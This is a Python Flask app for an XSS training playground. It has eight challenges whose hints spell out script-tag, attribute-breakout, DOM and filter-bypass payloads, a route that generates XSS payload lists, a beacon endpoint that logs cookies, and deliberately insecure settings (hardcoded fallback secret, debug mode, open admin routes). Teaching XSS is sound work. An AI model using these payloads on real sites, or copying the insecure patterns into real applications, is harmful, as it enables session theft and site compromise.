import os
import html
import json
import logging
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, jsonify, session, flash

# Configure logging for debugging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "xss-playground-enhanced-secret-key")

# In-memory storage for educational purposes
challenge_logs = []  # List to store XSS payload logs
user_progress = {}  # Track user progress through challenges

# Challenge definitions with increasing difficulty
CHALLENGES = {
    1: {
        'title': 'Reflected XSS - Basic',
        'difficulty': 'Easy',
        'description': 'Execute a basic XSS payload in a search parameter.',
        'objective': 'Make an alert box appear with the text "XSS"',
        'hint': 'Try using <script>alert("XSS")</script> in the search box',
        'flag': 'alert("XSS")',
        'type': 'reflected',
        'template': 'challenges/challenge1.html'
    },
    2: {
        'title': 'Reflected XSS - Attribute Context',
        'difficulty': 'Easy',
        'description': 'Escape from an HTML attribute to execute JavaScript.',
        'objective': 'Break out of the value attribute and execute alert(1)',
        'hint': 'You need to close the attribute first. Try: "><script>alert(1)</script>',
        'flag': 'alert(1)',
        'type': 'reflected',
        'template': 'challenges/challenge2.html'
    },
    3: {
        'title': 'Stored XSS - Comment System',
        'difficulty': 'Medium',
        'description': 'Store a malicious payload that executes for all users.',
        'objective': 'Create a stored XSS that shows alert("Stored") when the page loads',
        'hint': 'Submit a comment with a script tag that will persist',
        'flag': 'alert("Stored")',
        'type': 'stored',
        'template': 'challenges/challenge3.html'
    },
    4: {
        'title': 'DOM XSS - innerHTML',
        'difficulty': 'Medium',
        'description': 'Exploit client-side DOM manipulation.',
        'objective': 'Use the URL fragment to execute alert("DOM")',
        'hint': 'The page reads location.hash and uses innerHTML. Try #<script>alert("DOM")</script>',
        'flag': 'alert("DOM")',
        'type': 'dom',
        'template': 'challenges/challenge4.html'
    },
    5: {
        'title': 'XSS with Event Handlers',
        'difficulty': 'Medium',
        'description': 'Use HTML event handlers to execute JavaScript.',
        'objective': 'Execute alert("Events") using an event handler',
        'hint': 'Try using <img src=x onerror=alert("Events")>',
        'flag': 'alert("Events")',
        'type': 'reflected',
        'template': 'challenges/challenge5.html'
    },
    6: {
        'title': 'XSS Filter Bypass - Basic',
        'difficulty': 'Hard',
        'description': 'Bypass a basic XSS filter that blocks <script> tags.',
        'objective': 'Execute alert("Bypass") without using <script> tags',
        'hint': 'Try using alternative tags like <svg>, <img>, or <iframe>',
        'flag': 'alert("Bypass")',
        'type': 'reflected',
        'template': 'challenges/challenge6.html'
    },
    7: {
        'title': 'CSP Bypass - Unsafe Inline',
        'difficulty': 'Hard',
        'description': 'Bypass Content Security Policy using allowed sources.',
        'objective': 'Execute JavaScript despite CSP restrictions',
        'hint': 'Look for script sources that are whitelisted in the CSP',
        'flag': 'alert("CSP")',
        'type': 'reflected',
        'template': 'challenges/challenge7.html'
    },
    8: {
        'title': 'JSON Injection XSS',
        'difficulty': 'Hard',
        'description': 'Exploit XSS in a JSON context.',
        'objective': 'Break out of JSON and execute alert("JSON")',
        'hint': 'Try to escape the JSON string and inject JavaScript',
        'flag': 'alert("JSON")',
        'type': 'reflected',
        'template': 'challenges/challenge8.html'
    }
}

# Security mode - can be toggled between 'secure' and 'vulnerable'
security_mode = {'mode': 'vulnerable'}

@app.route('/')
def dashboard():
    """Main dashboard showing challenge overview and progress."""
    user_id = session.get('user_id', 'anonymous')
    progress = user_progress.get(user_id, {})
    
    # Calculate progress statistics
    total_challenges = len(CHALLENGES)
    solved_challenges = len([c for c in progress.values() if c.get('solved', False)])
    progress_percentage = int((solved_challenges / total_challenges) * 100) if total_challenges > 0 else 0
    
    challenge_list = []
    for challenge_id, challenge in CHALLENGES.items():
        challenge_info = challenge.copy()
        challenge_info['id'] = str(challenge_id)
        challenge_info['solved'] = progress.get(str(challenge_id), {}).get('solved', False)
        challenge_info['attempts'] = progress.get(str(challenge_id), {}).get('attempts', 0)
        challenge_list.append(challenge_info)
    
    return render_template('dashboard.html', 
                         challenges=challenge_list,
                         total_challenges=total_challenges,
                         solved_challenges=solved_challenges,
                         progress_percentage=progress_percentage,
                         security_mode=security_mode['mode'])

@app.route('/challenge/<int:challenge_id>')
def challenge(challenge_id):
    """Individual challenge page."""
    if challenge_id not in CHALLENGES:
        flash('Challenge not found!', 'error')
        return redirect(url_for('dashboard'))
    
    challenge_data = CHALLENGES[challenge_id].copy()
    challenge_data['id'] = str(challenge_id)
    
    user_id = session.get('user_id', 'anonymous')
    progress = user_progress.get(user_id, {}).get(str(challenge_id), {})
    
    challenge_data['solved'] = progress.get('solved', False)
    challenge_data['attempts'] = progress.get('attempts', 0)
    challenge_data['show_hint'] = progress.get('attempts', 0) >= 3
    
    return render_template(challenge_data['template'], 
                         challenge=challenge_data,
                         security_mode=security_mode['mode'])

@app.route('/challenge/<int:challenge_id>/submit', methods=['POST'])
def submit_challenge(challenge_id):
    """Handle challenge submission and validation."""
    if challenge_id not in CHALLENGES:
        return jsonify({'success': False, 'message': 'Challenge not found'})
    
    user_id = session.get('user_id', 'anonymous')
    payload = request.form.get('payload', '').strip()
    
    # Initialize user progress if not exists
    if user_id not in user_progress:
        user_progress[user_id] = {}
    
    if str(challenge_id) not in user_progress[user_id]:
        user_progress[user_id][str(challenge_id)] = {'attempts': 0, 'solved': False}
    
    # Increment attempt counter
    user_progress[user_id][str(challenge_id)]['attempts'] += 1
    
    challenge_data = CHALLENGES[challenge_id]
    expected_flag = challenge_data['flag']
    
    # Log the attempt
    log_entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_id': user_id,
        'challenge_id': challenge_id,
        'payload': payload,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'success': False
    }
    
    # Check if payload contains the expected flag
    if expected_flag.lower() in payload.lower():
        user_progress[user_id][str(challenge_id)]['solved'] = True
        log_entry['success'] = True
        challenge_logs.append(log_entry)
        
        return jsonify({
            'success': True, 
            'message': f'Challenge {challenge_id} solved! Well done!',
            'solved': True
        })
    else:
        challenge_logs.append(log_entry)
        attempts = user_progress[user_id][str(challenge_id)]['attempts']
        show_hint = attempts >= 3
        
        return jsonify({
            'success': False, 
            'message': f'Payload did not meet the objective. Attempts: {attempts}',
            'show_hint': show_hint,
            'hint': challenge_data['hint'] if show_hint else None
        })

@app.route('/log', methods=['POST', 'GET'])
def log_payload():
    """XSS payload logging endpoint for JavaScript beacons."""
    try:
        if request.method == 'POST':
            # Handle JSON payload
            payload_data = request.get_json() or {}
        else:
            # Handle GET request (image beacon)
            payload_data = {
                'type': request.args.get('type', 'beacon'),
                'payload': request.args.get('payload', ''),
                'url': request.args.get('url', '')
            }
        
        # Create log entry
        log_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'payload': payload_data.get('payload', ''),
            'type': payload_data.get('type', 'unknown'),
            'url': payload_data.get('url', request.referrer or 'Direct'),
            'challenge_id': payload_data.get('challenge_id', 'unknown'),
            'cookies': payload_data.get('cookies', ''),
            'user_id': session.get('user_id', 'anonymous')
        }
        
        challenge_logs.append(log_entry)
        app.logger.info(f"XSS payload logged: {log_entry}")
        
        if request.method == 'POST':
            return jsonify({'status': 'success', 'message': 'Payload logged'})
        else:
            # Return 1x1 transparent pixel for image beacon
            from flask import Response
            return Response(
                b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00\x3B',
                mimetype='image/gif'
            )
    
    except Exception as e:
        app.logger.error(f"Error logging payload: {e}")
        if request.method == 'POST':
            return jsonify({'status': 'error', 'message': str(e)}), 500
        else:
            return '', 500

@app.route('/logs')
def view_logs():
    """Display all logged XSS payloads."""
    return render_template('logs_enhanced.html', 
                         logs=reversed(challenge_logs),
                         security_mode=security_mode['mode'])

@app.route('/payload-generator')
def payload_generator():
    """Advanced payload generator with context-aware suggestions."""
    return render_template('payload_generator.html', security_mode=security_mode['mode'])

@app.route('/generate-payload', methods=['POST'])
def generate_payload():
    """Generate context-aware XSS payloads."""
    context = request.form.get('context', 'html')
    filter_type = request.form.get('filter', 'none')
    target = request.form.get('target', 'alert')
    
    payloads = []
    
    # Context-aware payload generation
    if context == 'html':
        payloads = [
            f'<script>{target}(1)</script>',
            f'<img src=x onerror={target}(1)>',
            f'<svg onload={target}(1)>',
            f'<iframe src="javascript:{target}(1)"></iframe>',
            f'<body onload={target}(1)>'
        ]
    elif context == 'attribute':
        payloads = [
            f'"><script>{target}(1)</script>',
            f'" onmouseover={target}(1) "',
            f'"><img src=x onerror={target}(1)>',
            f'" autofocus onfocus={target}(1) "',
            f'"><svg onload={target}(1)>'
        ]
    elif context == 'javascript':
        payloads = [
            f'";{target}(1);//',
            f"';{target}(1);//",
            f'}};{target}(1);//',
            f'</script><script>{target}(1)</script>',
            f'-{target}(1)-'
        ]
    elif context == 'url':
        payloads = [
            f'javascript:{target}(1)',
            f'data:text/html,<script>{target}(1)</script>',
            f'#<script>{target}(1)</script>',
            f'?search=<script>{target}(1)</script>',
            f'vbscript:{target}(1)'
        ]
    
    # Apply filter bypasses
    if filter_type == 'script_blocked':
        payloads = [p for p in payloads if '<script>' not in p.lower()]
        payloads.extend([
            f'<img src=x onerror={target}(1)>',
            f'<svg onload={target}(1)>',
            f'<iframe src="javascript:{target}(1)"></iframe>',
            f'<details open ontoggle={target}(1)>',
            f'<marquee onstart={target}(1)>'
        ])
    elif filter_type == 'quotes_filtered':
        payloads = [p.replace('"', '&quot;').replace("'", '&#x27;') for p in payloads]
        payloads.extend([
            f'<script>{target}(String.fromCharCode(49))</script>',
            f'<img src=x onerror={target}(String.fromCharCode(49))>',
            f'<svg onload={target}(/1/)>'
        ])
    
    return jsonify({'payloads': payloads})

@app.route('/toggle-security', methods=['POST'])
def toggle_security():
    """Toggle between secure and vulnerable modes."""
    new_mode = request.form.get('mode', 'vulnerable')
    security_mode['mode'] = new_mode
    flash(f'Security mode changed to: {new_mode.upper()}', 'info')
    return redirect(request.referrer or url_for('dashboard'))

@app.route('/progress')
def user_progress_view():
    """View user progress and statistics."""
    user_id = session.get('user_id', 'anonymous')
    progress = user_progress.get(user_id, {})
    
    detailed_progress = []
    for challenge_id, challenge in CHALLENGES.items():
        challenge_progress = progress.get(str(challenge_id), {})
        detailed_progress.append({
            'id': challenge_id,
            'title': challenge['title'],
            'difficulty': challenge['difficulty'],
            'solved': challenge_progress.get('solved', False),
            'attempts': challenge_progress.get('attempts', 0)
        })
    
    return render_template('progress.html', 
                         progress=detailed_progress,
                         security_mode=security_mode['mode'])

@app.route('/help')
def help_page():
    """Help and documentation page."""
    return render_template('help.html', security_mode=security_mode['mode'])

@app.route('/reset-progress', methods=['POST'])
def reset_progress():
    """Reset user progress."""
    user_id = session.get('user_id', 'anonymous')
    if user_id in user_progress:
        del user_progress[user_id]
    flash('Progress reset successfully!', 'success')
    return redirect(url_for('dashboard'))

@app.route('/export-logs')
def export_logs():
    """Export logs as JSON."""
    from flask import Response
    import json
    
    logs_json = json.dumps(challenge_logs, indent=2)
    return Response(
        logs_json,
        mimetype='application/json',
        headers={'Content-Disposition': 'attachment; filename=xss_logs.json'}
    )

@app.route('/clear-logs', methods=['POST'])
def clear_logs():
    """Clear all logs."""
    challenge_logs.clear()
    flash('All logs cleared!', 'success')
    return redirect(url_for('view_logs'))

# Initialize session for new users
@app.before_request
def before_request():
    if 'user_id' not in session:
        import uuid
        session['user_id'] = str(uuid.uuid4())[:8]

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)